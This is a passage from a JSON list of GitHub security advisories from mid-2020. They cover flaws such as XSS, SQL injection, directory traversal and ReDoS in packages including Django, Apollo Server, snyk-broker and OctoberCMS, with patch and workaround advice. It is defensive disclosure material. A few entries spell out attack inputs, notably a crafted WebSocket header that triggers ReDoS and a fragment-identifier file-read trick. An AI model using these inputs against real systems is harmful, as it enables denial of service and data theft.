    "ghsaId": "GHSA-f3j5-rmmp-3fc5",
    "publishedAt": "2020-06-15T18:44:48Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup.",
    "summary": "Improper Input Validation in jackson-databind"
  },
  {
    "ghsaId": "GHSA-mpgr-2cx9-327h",
    "publishedAt": "2020-06-11T21:09:04Z",
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nServers running SSB-DB 20.0.0 (which is packaged with SSB-Server 16.0.0) must upgrade immediately.\n\n**There is no evidence that other SSB apps are vulnerable or that this problem has been exploited in the wild.**\n\nThe `get()` method is supposed to only decrypt messages when you explicitly ask it to, but there's a bug where it's decrypting any message that it can. This means that it's returning the decrypted content of private messages, which a malicious peer could use to get access to private data. This only affects peers running SSB-DB@20.0.0 who also have private messages, and is only known to be exploitable if you're also running SSB-OOO (default in SSB-Server), which exposes a thin wrapper around `get()` to anonymous peers.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes, please upgrade to SSB-DB 20.0.1 (or SSB-Server 16.0.1) immediately.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nYou may be able to disable the most obvious attack vector, SSB-OOO, by disabling the plugin, but you should upgrade immediately anyway.\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [SSB-DB](https://github.com/ssbc/ssb-db/)",
    "summary": "Information disclosure in SSB-DB"
  },
  {
    "ghsaId": "GHSA-3gw4-m5w7-v89c",
    "publishedAt": "2020-06-11T00:04:15Z",
    "description": "# Summary\nIndy Node has a bug in TAA handling code. The current primary can be crashed with a malformed transaction from a client, which leads to a view change. Repeated rapid view changes have the potential of bringing down the network.\n\n# Discovery\nOn May 18, Evernym's monitoring of Sovrin StagingNet showed a report of StagingNet losing sufficient consensus to validate write transactions. The problem resolved itself within a few minutes. On May 20th we saw the alert multiple times, and we began analyzing the logs of our steward node. On May 21st we continued to see the alerts with increasing frequency.\n\nIt appears that someone is unknowingly sending a malformed transaction, and retrying when the transaction fails. The cause of the errors appear to be the TAA acceptance.\n\n# Proposed actions\n* Reproduce problem in integration tests and create a fix\n* Do a hotfix release branching from last stable (current master have some things merged that are too risky)\n* Upgrade BuilderNet, StagingNet and MainNet as soon as possible\n* Improve testing strategy on Indy Node to reduce probability of such bugs\n\n# Notes\n* The journalctl logs also show an out-of-memory problem on the Australia node. We need to evaluate if this should be raised as a separate issue.",
    "summary": "Uncontrolled Resource Consumption in Indy Node"
  },
  {
    "ghsaId": "GHSA-p66x-2cv9-qq3v",
    "publishedAt": "2020-06-10T23:38:01Z",
    "description": "Apache Commons BeanUtils, as distributed in lib/commons-beanutils-1.8.0.jar in Apache Struts 1.x through 1.3.10 and in other products requiring commons-beanutils through 1.9.2, does not suppress the class property, which allows remote attackers to \"manipulate\" the ClassLoader and execute arbitrary code via the class parameter, as demonstrated by the passing of this parameter to the getClass method of the ActionForm object in Struts 1.",
    "summary": "Arbitrary code execution in Apache Commons BeanUtils"
  },
  {
    "ghsaId": "GHSA-58pp-9c76-5625",
    "publishedAt": "2020-06-10T21:12:41Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.proxy.provider.remoting.RmiProvider (aka apache/commons-proxy).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-338v-3958-8v8r",
    "publishedAt": "2020-06-10T20:54:15Z",
    "description": "Race condition in JBoss Weld before 2.2.8 and 3.x before 3.0.0 Alpha3 allows remote attackers to obtain information from a previous conversation via vectors related to a stale thread state.",
    "summary": "Information disclosure in JBoss Weld"
  },
  {
    "ghsaId": "GHSA-6q48-vjq2-mwcj",
    "publishedAt": "2020-06-10T20:28:03Z",
    "description": "All versions of `umount` are vulnerable to Command Injection. The package fails to sanitize input rules and passes it directly to an exec call on the umount function . This may allow attackers to execute arbitrary code in the system if the device value passed to the function is user-controlled.\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
    "summary": "Command injection in umount"
  },
  {
    "ghsaId": "GHSA-96r7-mrqf-jhcc",
    "publishedAt": "2020-06-10T20:27:53Z",
    "description": "ini-parser through 0.0.2 is vulnerable to Prototype Pollution.The library could be tricked into adding or modifying properties of Object.prototype using a '__proto__' payload.",
    "summary": "Prototype pollution in ini-parser"
  },
  {
    "ghsaId": "GHSA-864j-6qpp-cmrr",
    "publishedAt": "2020-06-10T20:03:02Z",
    "description": "sql.rb in Geocoder before 1.6.1 allows Boolean-based SQL injection when within_bounding_box is used in conjunction with untrusted sw_lat, sw_lng, ne_lat, or ne_lng data.",
    "summary": "SQL Injection in Geocoder"
  },
  {
    "ghsaId": "GHSA-x64g-4xx9-fh6x",
    "publishedAt": "2020-06-10T20:02:58Z",
    "description": "CiphertextHeader.java in Cryptacular before 1.2.4, as used in Apereo CAS and other products, allows attackers to trigger excessive memory allocation during a decode operation, because the nonce array length associated with &quot;new byte&quot; may depend on untrusted input within the header of encoded data.",
    "summary": "Denial of Service in Cryptacular"
  },
  {
    "ghsaId": "GHSA-r24h-634p-m72x",
    "publishedAt": "2020-06-10T20:02:47Z",
    "description": "In schema-inspector before 1.6.9, a maliciously crafted JavaScript object can bypass the `sanitize()` and the `validate()` function used within schema-inspector.",
    "summary": "Validation Bypass in schema-inspector"
  },
  {
    "ghsaId": "GHSA-6vwp-35w3-xph8",
    "publishedAt": "2020-06-10T20:02:39Z",
    "description": "An untrusted deserialization was found in the org.apache.xmlrpc.parser.XmlRpcResponseParser:addResult method of Apache XML-RPC (aka ws-xmlrpc) library. A malicious XML-RPC server could target a XML-RPC client causing it to execute arbitrary code.\n\nApache XML-RPC is no longer maintained and this issue will not be fixed.",
    "summary": "Insecure Deserialization in Apache XML-RPC"
  },
  {
    "ghsaId": "GHSA-f93p-f762-vr53",
    "publishedAt": "2020-06-10T20:02:33Z",
    "description": "By default, Apache CXF creates a /services page containing a listing of the available endpoint names and addresses. This webpage is vulnerable to a reflected Cross-Site Scripting (XSS) attack, which allows a malicious actor to inject javascript into the web page. Please note that the attack exploits a feature which is not typically not present in modern browsers, who remove dot segments before sending the request. However, Mobile applications may be vulnerable.",
    "summary": "Reflected Cross-Site Scripting in Apache CXF"
  },
  {
    "ghsaId": "GHSA-qr95-4mq5-r3fh",
    "publishedAt": "2020-06-10T19:40:30Z",
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nAnyone using >= v1.0.0 < v1.6.0.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes. Upgrading to at least >= v1.6.0 will resolve the problem (though upgrading to v2, which is the current major version, would be preferable, seeing as v1 is kind of old now and will most likely be marked as EoL when v3 is released in the near future).\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nYes. In the package's configuration, disable archive checking by setting `check_archives` to `false` (thus avoiding execution of the affected parts of the codebase entirely).\n\n### References\n_Are there any links users can visit to find out more?_\n\nYes. The vulnerability is documented at [SECURITY.md](https://github.com/phpMussel/phpMussel/security/policy) and also at [#167](https://github.com/phpMussel/phpMussel/issues/167).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Comment at the issue linked to this advisory, or..\n* Contact [the package author](https://github.com/Maikuolan) ([082e6bc1046fab95](https://peegeepee.com/046FAB95)).",
    "summary": "Phar unserialization vulnerability in phpMussel"
  },
  {
    "ghsaId": "GHSA-2q66-6cc3-6xm8",
    "publishedAt": "2020-06-09T00:25:41Z",
    "description": "### Impact\n\nBolt CMS lacked CSRF protection in the preview generating endpoint. Previews are intended to be generated by the admins, developers, chief-editors, and editors, who are authorized to create content in the application. But due to lack of proper CSRF protection, unauthorized users could generate a preview.\n\n### Patches\n\nThis has been fixed in Bolt 3.7.1\n\n### References\n\nRelated issue: https://github.com/bolt/bolt/pull/7853",
    "summary": "CSRF issue on preview pages in Bolt CMS"
  },
  {
    "ghsaId": "GHSA-68q3-7wjp-7q3j",
    "publishedAt": "2020-06-09T00:25:34Z",
    "description": "### Impact\n\nThe filename of uploaded files was vulnerable to stored XSS. It is not possible to inject javascript code in the file name when creating/uploading the file. But, once created/uploaded, it can be renamed to inject the payload in it. \n\nAdditionally, the measures to prevent renaming the file to disallowed filename extensions could be circumvented.\n\n### Patches\n\nThis is fixed in Bolt 3.7.1.\n\n### References\n\nRelated issue: https://github.com/bolt/bolt/pull/7853",
    "summary": "The filename of uploaded files vulnerable to stored XSS"
  },
  {
    "ghsaId": "GHSA-4852-vrh7-28rf",
    "publishedAt": "2020-06-09T00:24:57Z",
    "description": "### Impact\n\n**directly impacted:**\n\n- `graphql-playground-html@<1.6.22` - all unsanitized user input for `renderPlaygroundPage()`\n\n**all of our consuming packages** of `graphql-playground-html` are impacted:\n\n- `graphql-playground-middleware-express@<1.7.16` - unsanitized user input to `expressPlayground()`\n- `graphql-playground-middleware-koa@<1.6.15` - unsanitized user input to `koaPlayground()`\n- `graphql-playground-middleware-lambda@<1.7.17` - unsanitized user input to `lambdaPlayground()`\n- `graphql-playground-middleware-hapi@<1.6.13` - unsanitized user input to `hapiPlayground()`\n\nas well as ***any other packages*** that use these methods with unsanitized user input.\n\n**not impacted:**\n\n- `graphql-playground-electron` - uses `renderPlaygroundPage()` statically for a webpack build for electron bundle, no dynamic user input\n- `graphql-playground-react` - usage of the component directly in a react application does not expose reflected XSS vulnerabilities. only the demo in `public/` contains the vulnerability, because it uses an old version of the html pacakge.\n\n### Patches\n\nupgrading to the above mentioned versions will solve the issue.\n\nIf you're using `graphql-playground-html` directly, then:\n\n```\nyarn add graphql-playground-html@^1.6.22\n```\n\nor\n\n```\nnpm install --save graphql-playground-html@^1.6.22\n```\n\nThen, similar steps need to be taken for each middleware:\n\n- [Upgrade Express Middleware](https://www.npmjs.com/package/graphql-playground-middleware-express#security-upgrade-steps)\n- [Upgrade Koa Middleware](https://www.npmjs.com/package/graphql-playground-middleware-koa#security-upgrade-steps)\n- [Upgrade Lambda Middleware](https://www.npmjs.com/package/graphql-playground-middleware-lambda#security-upgrade-steps)\n- [Upgrade Hapi Middleware](https://www.npmjs.com/package/graphql-playground-middleware-hapi#security-upgrade-steps)\n\n### Workarounds\n\nEnsure you properly sanitize *all* user input for options you use for whatever function to initialize GraphQLPlayground:\n\nfor example, with `graphql-playground-html` and express:\n\n```js\nconst { sanitizeUrl } = require('@braintree/sanitize-url');\n\nconst qs = require('querystringify');\n\nconst { renderPlaygroundPage } = require('graphql-playground-html');\n\nmodule.exports = (req, res, next) => {\n\tconst { endpoint } = qs.parse(req.url)\n\tres.html(renderPlaygroundPage({endpoint: sanitizeUrl(endpoint) })).status(200)\n\tnext()\n}\n```\n\nor, with `graphql-playground-express`:\n\n```js\nconst { expressPlayground } = require('graphql-playground-middleware-express');\nconst { sanitizeUrl } = require('@braintree/sanitize-url');\n\nconst qs = require('querystringify');\n\nconst { renderPlaygroundPage } = require('graphql-playground-html');\n\nmodule.exports = (req, res, next) => {\n\tconst { endpoint } = qs.parse(req.url)\n\tres.html(expressPlayground({endpoint: sanitizeUrl(endpoint) })).status(200)\n\tnext()\n}\n```\n\n### References\n\n- [OWASP: How to Test for CSS Reflection Attacks](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md)\n- [Original Report from Cure53](https://user-images.githubusercontent.com/1368727/84191028-dfb7b980-aa65-11ea-8e18-4b8706f538e2.jpg) (jpg)\n\n\n### Credits\n\nMasato Kinugawa of Cure53\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [graphql-playground](https://github.com/prisma-labs/graphql-playground/issues/new/choose)\n* Email us at [rikki.schulte@gmail.com](mailto:rikki.schulte@gmail.com)",
    "summary": "Reflected XSS in GraphQL Playground"
  },
  {
    "ghsaId": "GHSA-w42g-7vfc-xf37",
    "publishedAt": "2020-06-05T19:38:14Z",
    "description": "We encourage all users of Apollo Server to read this advisory in its entirety to understand the impact.  The _Resolution_ section contains details on patched versions.\n\n### Impact\n\nIf `subscriptions: false` is passed to the `ApolloServer` constructor options, there is no impact.  If implementors were not expecting validation rules to be enforced on the WebSocket subscriptions transport **and** are unconcerned about introspection being enabled on the WebSocket subscriptions transport (or were not expecting that), then this advisory is not applicable.  If `introspection: true` is passed to the `ApolloServer` constructor options, the impact is limited to user-provided validation rules (i.e., using `validationRules`) since there would be no expectation that introspection was disabled.\n\nThe enforcement of user-provided validation rules on the HTTP transport is working as intended and is unaffected by this advisory.  Similarly, disabling introspection on the HTTP transport is working as intended and is unaffected by this advisory.\n\n> **Note:** Unless `subscriptions: false` is explicitly passed to the constructor parameters of `new ApolloServer({ ... })`, **subscriptions are enabled by default, whether or not there is a `Subscription` type present in the schema.**  As an alternative to upgrading to a patched version, see the _Workarounds_ section below to disable subscriptions if it is not necessary.\n\nIn cases where `subscriptions: false` is **not** explicitly set, the subscription server **is impacted** since validation rules which are enforced on the main request pipeline within Apollo Server were not being passed to the `SubscriptionServer.create` invocation ([seen here, prior to the patch](https://github.com/apollographql/apollo-server/blob/7d6f23443e52a90deb74f152f34bb76eea78ee19/packages/apollo-server-core/src/ApolloServer.ts#L677-L726)). \n\nThe omitted validation rules for the subscription server include any `validationRules` passed by implementors to the `ApolloServer` constructor which were expected to be enforced on the subscriptions WebSocket endpoint.  **Additionally**, because an internal [`NoIntrospection`](https://github.com/apollographql/apollo-server/blob/7d6f23443/packages/apollo-server-core/src/ApolloServer.ts#L77-L88) validation rule is used to disable introspection, it would have been possible to introspect a server on the WebSocket endpoint that the `SubscriptionServer` creates even though it was not possible on other transports (e.g. HTTP).\n\n**The severity of risk depends on whether sensitive information is being stored in the schema itself.**  The contents of schema descriptions, or secrets which might be revealed by the names of types or field names within those types, will determine the risk to individual implementors.\n\n### Affected packages\n\nThe bug existed in `apollo-server-core` versions prior to version 2.14.2, however, this means all integration packages (e.g., `apollo-server-express`, etc.) prior to version 2.14.2 which depend on `apollo-server-core` for their subscriptions support are affected.  This includes the `apollo-server` package that automatically provides an Express server.\n\nTherefore, for officially published Apollo Server packages, the full list of affected packages includes: `apollo-server`, `apollo-server-azure-functions`, `apollo-server-cache-memcached`, `apollo-server-core`, `apollo-server-cloud-functions`, `apollo-server-cloudflare`, `apollo-server-express`, `apollo-server-fastify`, `apollo-server-hapi`, `apollo-server-koa`, `apollo-server-lambda`, and `apollo-server-micro`.\n\n> Note: The full list included here doesn't fit into the box provided by the GitHub Security Advisories form.\n\n### Resolution\n\nThe problem is resolved in Apollo Server versions 2.14.2 or higher.  If upgrading is not an option, see _Workarounds_ below.  When upgrading, ensure that the affected integration package (e.g., `apollo-server-express`) **and** the `apollo-server-core` package are both updated to the patched versions.  (The version numbers should both be  2.14.2.)\n\n### Workarounds\n\nUpgrading to a patched version is the recommended solution.  If upgrading is not an option, subscriptions can be disabled with `subscriptions: false` to resolve the impact.  **Disabling subscriptions in this way will disable _all_ subscriptions support and the WebSocket transport**:\n\n```js\nconst server = new ApolloServer({\n  subscriptions: false,\n  /* Other options, such as typeDefs, resolvers, schema, etc. */\n});\n```\n\n### For more information\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/apollographql/apollo-server/issues/new) and the maintainers will try to assist.\n\n### Credit and appreciation\n\nApollo fully believes in ethical disclosure of vulnerabilities by security researchers who notify us with details and provide us time to address and fix the issues before publicly disclosing.\n\nCredit for this discovery goes to the team at [Bitwala](https://www.bitwala.com/), who reported the concern to us responsibly after discovering it during their own auditing.",
    "summary": "Introspection in schema validation in Apollo Server"
  },
  {
    "ghsaId": "GHSA-v73w-r9xg-7cr9",
    "publishedAt": "2020-06-05T19:37:49Z",
    "description": "### Impact\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466) by applying the recommended patch from @jquery.\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/5c7ba9fbe9f2b596b2f0e3436ee06b91b97e5892 to your installation manually if unable to upgrade to Build 466.\n\n### References\n- https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11022\n- https://jquery.com/upgrade-guide/3.5/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat Assessment\nAssessed as Moderate by the @jquery team.\n\n### Acknowledgements\n\nThanks to @mrgswift for reporting the issue to the October CMS team.",
    "summary": "Use of insecure jQuery version in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-2m34-jcjv-45xf",
    "publishedAt": "2020-06-05T16:24:28Z",
    "description": "An issue was discovered in Django 2.2 before 2.2.13 and 3.0 before 3.0.7. Query parameters generated by the Django admin ForeignKeyRawIdWidget were not properly URL encoded, leading to a possibility of an XSS attack.",
    "summary": "XSS in Django"
  },
  {
    "ghsaId": "GHSA-wpjr-j57x-wxfw",
    "publishedAt": "2020-06-05T16:20:44Z",
    "description": "An issue was discovered in Django 2.2 before 2.2.13 and 3.0 before 3.0.7. In cases where a memcached backend does not perform key validation, passing malformed cache keys could result in a key collision, and potential data leakage.",
    "summary": "Data leakage via cache key collision in Django"
  },
  {
    "ghsaId": "GHSA-g78m-2chm-r7qv",
    "publishedAt": "2020-06-05T16:16:12Z",
    "description": "### Impact\n\nThe ReDoS flaw allows an attacker to exhaust the server's capacity to process\nincoming requests by sending a WebSocket handshake request containing a header\nof the following form:\n\n    Sec-WebSocket-Extensions: a; b=\"\\c\\c\\c\\c\\c\\c\\c\\c\\c\\c ...\n\nThat is, a header containing an unclosed string parameter value whose content is\na repeating two-byte sequence of a backslash and some other character. The\nparser takes exponential time to reject this header as invalid, and this will\nblock the processing of any other work on the same thread. Thus if you are\nrunning a single-threaded server, such a request can render your service\ncompletely unavailable.\n\n### Patches\n\nUsers should upgrade to version 0.1.4.\n\n### Workarounds\n\nThere are no known work-arounds other than disabling any public-facing\nWebSocket functionality you are operating.\n\n### References\n\n- https://blog.jcoglan.com/2020/06/02/redos-vulnerability-in-websocket-extensions/",
    "summary": "Regular Expression Denial of Service in websocket-extensions (NPM package)"
  },
  {
    "ghsaId": "GHSA-hwj3-m3p6-hj38",
    "publishedAt": "2020-06-05T16:13:36Z",
    "description": "dom4j before 2.1.3 allows external DTDs and External Entities by default, which might enable XXE attacks. However, there is popular external documentation from OWASP showing how to enable the safe, non-default behavior in any application that uses dom4j.\n\nNote: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",
    "summary": "dom4j allows External Entities by default which might enable XXE attacks"
  },
  {
    "ghsaId": "GHSA-48rw-j489-928m",
    "publishedAt": "2020-06-05T16:13:29Z",
    "description": "Spring Security versions 5.2.x prior to 5.2.4 and 5.3.x prior to 5.3.2 contain a signature wrapping vulnerability during SAML response validation. When using the spring-security-saml2-service-provider component, a malicious user can carefully modify an otherwise valid SAML response and append an arbitrary assertion that Spring Security will accept as valid.",
    "summary": "Signature wrapping vulnerability in Spring Security"
  },
  {
    "ghsaId": "GHSA-32xf-jwmv-9hf3",
    "publishedAt": "2020-06-05T16:13:20Z",
    "description": "Spring Cloud Config, versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead to a directory traversal attack.",
    "summary": "Directory traversal attack in Spring Cloud Config"
  },
  {
    "ghsaId": "GHSA-g86w-v5vg-9gxf",
    "publishedAt": "2020-06-05T16:11:36Z",
    "description": "Spring Cloud Config, versions 2.2.x prior to 2.2.2, versions 2.1.x prior to 2.1.7, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead a directory traversal attack.",
    "summary": "Directory traversal attack in Spring Cloud Config"
  },
  {
    "ghsaId": "GHSA-5wm5-8q42-rhxg",
    "publishedAt": "2020-06-05T16:11:02Z",
    "description": "Apache Ignite uses H2 database to build SQL distributed execution engine. H2 provides SQL functions which could be used by attacker to access to a filesystem.",
    "summary": "File system access via H2 in Apache Ignite"
  },
  {
    "ghsaId": "GHSA-fpjm-rp2g-3r4c",
    "publishedAt": "2020-06-05T16:09:34Z",
    "description": "An issue was discovered in drf-jwt 1.15.x before 1.15.1. It allows attackers with access to a notionally invalidated token to obtain a new, working token via the refresh endpoint, because the blacklist protection mechanism is incompatible with the token-refresh feature. NOTE: drf-jwt is a fork of jpadilla/django-rest-framework-jwt, which is unmaintained.",
    "summary": "Django Rest Framework allows obtaining new token from notionally invalidated token"
  },
  {
    "ghsaId": "GHSA-37cf-r3w2-gjfw",
    "publishedAt": "2020-06-05T16:09:19Z",
    "description": "django-nopassword before 5.0.0 stores cleartext secrets in the database.",
    "summary": "django-nopassword stores secrets in cleartext "
  },
  {
    "ghsaId": "GHSA-3gh2-xw74-jmcw",
    "publishedAt": "2020-06-05T14:52:07Z",
    "description": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
    "summary": "SQL injection in Django"
  },
  {
    "ghsaId": "GHSA-v8v8-6859-qxm4",
    "publishedAt": "2020-06-05T14:47:02Z",
    "description": "Lack of output sanitization allowed an attack to execute arbitrary shell commands via the logkitty npm package before version 0.7.1.",
    "summary": "Arbitrary shell command execution in logkitty"
  },
  {
    "ghsaId": "GHSA-g6wq-qcwm-j5g2",
    "publishedAt": "2020-06-05T14:21:29Z",
    "description": "### Impact\n\nThe ReDoS flaw allows an attacker to exhaust the server's capacity to process\nincoming requests by sending a WebSocket handshake request containing a header\nof the following form:\n\n    Sec-WebSocket-Extensions: a; b=\"\\c\\c\\c\\c\\c\\c\\c\\c\\c\\c ...\n\nThat is, a header containing an unclosed string parameter value whose content is\na repeating two-byte sequence of a backslash and some other character. The\nparser takes exponential time to reject this header as invalid, and this will\nblock the processing of any other work on the same thread. Thus if you are\nrunning a single-threaded server, such a request can render your service\ncompletely unavailable.\n\n### Patches\n\nUsers should upgrade to version 0.1.5.\n\n### Workarounds\n\nThere are no known work-arounds other than disabling any public-facing\nWebSocket functionality you are operating.\n\n### References\n\n- https://blog.jcoglan.com/2020/06/02/redos-vulnerability-in-websocket-extensions/",
    "summary": "Regular Expression Denial of Service in websocket-extensions (RubyGem)"
  },
  {
    "ghsaId": "GHSA-vwqq-5vrc-xw9h",
    "publishedAt": "2020-06-05T14:15:51Z",
    "description": "Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.",
    "summary": "Improper validation of certificate with host mismatch in Apache Log4j SMTP appender"
  },
  {
    "ghsaId": "GHSA-c8wh-6jw4-2h79",
    "publishedAt": "2020-06-03T23:19:12Z",
    "description": "### Impact\nThe debugbar contains a perhaps little known feature where it will log all requests (and all information pertaining to each request including session data) whenever it is enabled. This presents a problem if the plugin is ever enabled on a system that is open to untrusted users as the potential exists for them to use this feature to view all requests being made to the application and obtain sensitive information from those requests. There even exists the potential for account takeovers of authenticated users by non-authenticated public users, which would then lead to a number of other potential issues as an attacker could theoretically get full access to the system if the required conditions existed.\n\n### Patches\nIssue has been patched in v3.1.0 by locking down access to the debugbar to all users; it now requires an authenticated backend user with a specifically enabled permission before it is even usable, and the feature that allows access to stored request information is restricted behind a different permission that's more restrictive.\n\n### Workarounds\nApply https://github.com/rainlab/debugbar-plugin/commit/86dd29f9866d712de7d98f5f9dc67751b82ecd18 to your installation manually if unable to upgrade to v3.1.0.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Acknowledgements\n\nThanks to [Freddie Poser](https://twitter.com/vogonjeltz101) for reporting the issue to the RainLab team.",
    "summary": "Potential unauthorized access to stored request & session data when plugin is misconfigured in October CMS Debugbar"
  },
  {
    "ghsaId": "GHSA-x7m2-6g99-84w5",
    "publishedAt": "2020-06-03T22:02:24Z",
    "description": "All versions of snyk-broker before 4.80.0 are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users with access to Snyk's internal network via directory traversal.",
    "summary": "Arbitrary File Read in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-4vj3-f849-5r48",
    "publishedAt": "2020-06-03T22:02:21Z",
    "description": "All versions of snyk-broker before 4.80.0 are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users with access to Snyk's internal network by creating symlinks to match whitelisted paths.",
    "summary": "Arbitrary File Read in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-9xv2-548x-5h79",
    "publishedAt": "2020-06-03T22:02:19Z",
    "description": "All versions of snyk-broker before 4.72.2 are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users who have access to Snyk's internal network by appending the URL with a fragment identifier and a whitelisted path e.g. `#package.json`",
    "summary": "Arbitrary File Read in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-2fmp-7xwf-wvwr",
    "publishedAt": "2020-06-03T22:02:16Z",
    "description": "All versions of snyk-broker after 4.72.0 including and before 4.73.1 are vulnerable to Arbitrary File Read. It allows arbitrary file reads to users with access to Snyk's internal network of any files ending in the following extensions: yaml, yml or json.",
    "summary": "Arbitrary File Read in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-mgh5-4h95-qj4p",
    "publishedAt": "2020-06-03T22:02:14Z",
    "description": "All versions of snyk-broker before 4.73.1 are vulnerable to Information Exposure. It logs private keys if logging level is set to DEBUG.",
    "summary": "Information Exposure in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-45hw-29x7-9x95",
    "publishedAt": "2020-06-03T22:02:11Z",
    "description": "All versions of snyk-broker before 4.79.0 are vulnerable to Arbitrary File Read. It allows partial file reads for users who have access to Snyk's internal network via patch history from GitHub Commits API.",
    "summary": "Arbitrary File Read in Snyk Broker"
  },
  {
    "ghsaId": "GHSA-4rhm-m2fp-hx7q",
    "publishedAt": "2020-06-03T21:58:35Z",
    "description": "### Impact\nAny users with the ability to modify any data that could eventually be exported as a CSV file from the `ImportExportController` could potentially introduce a CSV injection into the data to cause the generated CSV export file to be malicious. This requires attackers to achieve the following before a successful attack can be completed: \n\n1. Have found a vulnerability in the victim's spreadsheet software of choice.\n2. Control data that would potentially be exported through the `ImportExportController` by a theoretical victim.\n3. Convince the victim to export above data as a CSV and run it in vulnerable spreadsheet software while also bypassing any sanity checks by said software.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/library/commit/c84bf03f506052c848f2fddc05f24be631427a1a & https://github.com/octobercms/october/commit/802d8c8e09a2b342649393edb6d3ceb958851484 to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by @chrisvidal initially & [Sivanesh Ashok](https://stazot.com/) later.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\nGiven the number of hoops that a potential attacker would have to jump through, this vulnerability really boils down to the possibility of abusing the trust that a user may have in the export functionality of the project. Thus, this has been rated low severity as it requires vulnerabilities to also exist in other software used by any potential victims as well as successful social engineering attacks.",
    "summary": "Potential CSV Injection vector in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-gg6x-xx78-448c",
    "publishedAt": "2020-06-03T21:58:32Z",
    "description": "### Impact\nA user with the ability to use the import functionality of the `ImportExportController` behavior could be socially engineered by an attacker to upload a maliciously crafted CSV file which could result in a reflected XSS attack on the user in question\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/cd0b6a791f995d86071a024464c1702efc50f46c to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1100\" alt=\"Screen Shot 2020-03-31 at 2 01 52 PM\" src=\"https://user-images.githubusercontent.com/7253840/78070158-8f7ef580-7358-11ea-950c-226533f6a0a3.png\">",
    "summary": "Reflected XSS when importing CSV in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-9722-rr68-rfpg",
    "publishedAt": "2020-06-03T21:58:27Z",
